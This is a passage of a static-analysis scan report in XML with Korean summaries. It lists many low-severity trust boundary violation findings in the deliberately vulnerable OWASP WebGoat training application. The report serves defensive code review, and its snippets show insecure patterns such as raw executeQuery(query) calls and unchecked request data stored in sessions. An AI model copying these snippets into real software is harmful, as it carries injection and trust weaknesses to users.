                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F5F6828917C735B71FCDD3304E249672" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Controller.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/servlets/Controller.java</FilePath>
<LineStart>65</LineStart>
<Snippet>    {

	String userAgent = request.getHeader("user-agent");

	String clientBrowser = "Not known!";</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5FE58BC430EF0154D6A6546C2ADC694F" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A38556DE67E45D6FD76EB8CA305BF7E2" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Controller.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Controller.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/servlets/Controller.java</FilePath>
<LineStart>77</LineStart>
<Snippet>	}

	request.setAttribute("client.browser", clientBrowser);

	request.getRequestDispatcher("/view.jsp").forward(request, response);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Controller.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/servlets/Controller.java</FilePath>
<LineStart>65</LineStart>
<Snippet>    {

	String userAgent = request.getHeader("user-agent");

	String clientBrowser = "Not known!";</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FA1B2383AC30357963833897FB714033" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="208B70F25DB05D991F70BA5B297FC9C4" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 updateSession() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>495</LineStart>
<Snippet>	    // System.out.println( "HH Creating new WebSession: " );
	    session = new WebSession(this, context);
	    hs.setAttribute(WebSession.SESSION, session);
	    // reset timeout
	    hs.setMaxInactiveInterval(sessionTimeoutSeconds);</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="43BB5E2B9AB8CCFB0A317DCF466D3A31" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7E2557C47178B3AD6E4CB33094A75372" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="261251CA851CBAC45E734048A0F170EC" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FAE39A4ED1EF2DF9AAC3466566CC03CA" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="390BCA437C6422EC3526C3CC754CB30C" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 updateSession() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>495</LineStart>
<Snippet>	    // System.out.println( "HH Creating new WebSession: " );
	    session = new WebSession(this, context);
	    hs.setAttribute(WebSession.SESSION, session);
	    // reset timeout
	    hs.setMaxInactiveInterval(sessionTimeoutSeconds);</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebgoatProperties.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebgoatProperties.java</FilePath>
<LineStart>44</LineStart>
<Snippet>	{
	    FileInputStream in = new FileInputStream(propertiesFileName);
	    load(in);
	}
	catch (IOException e)</Snippet>
<TargetFunction>java.util.Properties.load()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5311108B4746EBFAC9956AEFF0FC26CE" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>274</LineStart>
<Snippet>		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="74F4CE93BA9CCBFB2A741C34591DAFE1" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="92CDA0995BD2C2EB0F2762BB07FCD9FA" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebgoatProperties.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebgoatProperties.java</FilePath>
<LineStart>44</LineStart>
<Snippet>	{
	    FileInputStream in = new FileInputStream(propertiesFileName);
	    load(in);
	}
	catch (IOException e)</Snippet>
<TargetFunction>java.util.Properties.load()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="80A3A11CD9D722CAA90546C38D01517F" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>183</LineStart>
<Snippet>		clientBrowser = userAgent;
	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>177</LineStart>
<Snippet>
	    // Redirect the request to our View servlet
	    String userAgent = request.getHeader("user-agent");
	    String clientBrowser = "Not known!";
	    if (userAgent != null)</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EFE195B8C223E53A8AD8AD569A74B339" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="70465521CD485DBAEDEE7562E4F4A248" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="76ACE926CD7F72F284C55B9653471C96" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setRequestAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>94</LineStart>
<Snippet>	public void setRequestAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CAFB241B0D6C925FB585C47C5F181873" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setRequestAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>94</LineStart>
<Snippet>	public void setRequestAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6F5653ECA209914267634F8013D8D72F" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F74523852DB13B48C99C29467A9C45E1" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="386F875C60973B43496DAC1C8703FD48" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
